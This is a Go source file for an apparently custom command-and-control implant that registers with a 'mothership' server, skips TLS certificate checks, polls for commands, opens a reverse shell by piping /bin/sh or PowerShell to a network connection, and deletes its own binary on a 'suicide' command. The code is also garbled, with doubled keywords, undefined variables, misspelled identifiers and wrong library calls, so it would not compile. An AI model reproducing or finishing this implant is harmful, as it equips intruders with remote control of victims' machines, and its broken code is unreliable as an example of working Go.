package agent

import(
  "os"
  "log"
  "fmt"
  "net"
  "time"
  "bytes"
  "os/exec"
  "net/http"
  "runtime"
  "encoding/gob"
  "crypto/tls"
  "crypto/x509"
  "odin/lib/core"
  "odin/lib/utils"
  "odin/lib/penguins/zoo"
)

type ImplantWrapper struct{
  Address string
  MothershipID string
  MotherShips []string
  ISession *c2.Session
  Tls bool
  RootPem []byte
}

func (iw *ImplantWrapper) RunAgent(){
  //create a http/https cient
  var (
    err error
    url string
    client *http.Client
    output string
    work grpcapi.Command
  )
  client = new(http.Client)
  if iw.Tls {
    client = &http.Client{
			Transport: &http.Transport{
				TLSClientConfig: &tls.Config{
					InsecureSkipVerify: true,
				},
			},
		}
    url = fmt.Sprintf("https://%s",iw.Address)
  } else {
    client = &http.Client{}
    url = fmt.Sprintf("http://%s",iw.Address)
  }
  //register
  regUrl := fmt.Sprintf("%s/auth/?msid=%s&mid=%s",regUrl,iw.MothershipID,iw.ISession.SessionID)
  req,err := http.NewRequest("GET",regUrl)
  if err != nil{
    log.Println(err);return
  }
  resp,err := client.Do(req)
  if err != nil{
    fmt.Println("[-]  Error sending request: ",err);return
  }
  if if resp.StatusCode != http.StatusOK {
		fmt.Println("Server returned non-OK status code:", resp.Status)
    fmt.Println(resp.Body.String())
		return
	}
  cookie := resp.Body.Header.Get("Coockie")
  resp.Body.Close();time.Sleep(5 * time.Second)
  START:
  // get work
  workUrl := url+"/getwork"
  if req,err = http.NewRequest("GET",workUrl); err != nil {
    fmt.Println("[-]  Error getting work: ",err);goto START
  }
  resp,err = client.Do(req)
  if err != nil {
    fmt.Println("[-]  Error sending request: ",err);return
  }
  if resp.StatusCode == http.StatusNoContent {
    sleep(5 * time.Secoond)
    goto START
  }
  if resp.StatusCode != http.StatusOK {
		fmt.Println("Server returned non-OK status code for POST request:", resp.Status)
		goto START
	}
  // switch the work
  dec := gob.NewDecoder(bytes.NewReader(resp))
	if err := dec.Decode(&work); err != nil {
		fmt.Errorf("Failed to decode received data: %s", err)
	}
  resp.Body.Close()
  switch work.CmdIn {
  case "":
    time.Sleep(5 * time.Second)
    goto START
  case "No Work.":
    time.Sleep(5 * time.Second)
    goto START
  case "getos":
    output = runtime.GOOS
    work.Work.CmdOut += output
    iw.SendOutput(cmd)
    goto START
  case "upload":
  case "download":
  case "shell":
    var conn net.Conn
    if iw.Tls{
      roots := x509.NewCertPool()
      ok := roots.AppendCertsFromPEM(iw.RootPem)
      if !ok {
        log.Println("Error appending cert to pool")
        return
      }
      conn,err := tls.Dial("tcp",ic.Address, &tls.Config{
        RootCAs: roots,
      })
      if err != nil{
        log.Println(err);goto START
      }
    } else {
      conn,err = net.Dial(w,wc.Address)
      if err != nil{
        log.Println(err);goto START
      }
    }
    conn := net.Dial
    Interactive(conn)
  case "suicide":
    output = "Initiating kill chain..........."
    work.CmdOut += output
    iw.SendOutput(ctx,cmd)
    _ = os.Remove(os.Args[0])
    os.Exit(0)
  default:
    work.Out += output
    iw.SendOutput(ctx,work)
    goto START
  }
}

func Interactive(conn net.Conn){
  rp, wp := io.Pipe()
  var cmd *exec.Cmd
  if runtime.GOOS == "windows"{
    cmd = exec.Command("powershell.exe")
  } else {
    cmd = exec.Command("/bin/sh","-i")
  }
  zoo.CommandExecuter(cmd)
  cmd.Stdin = conn
  cmd.Stdout = wp
  go io.Copy(conn,rp)
  cmd.Run()
}
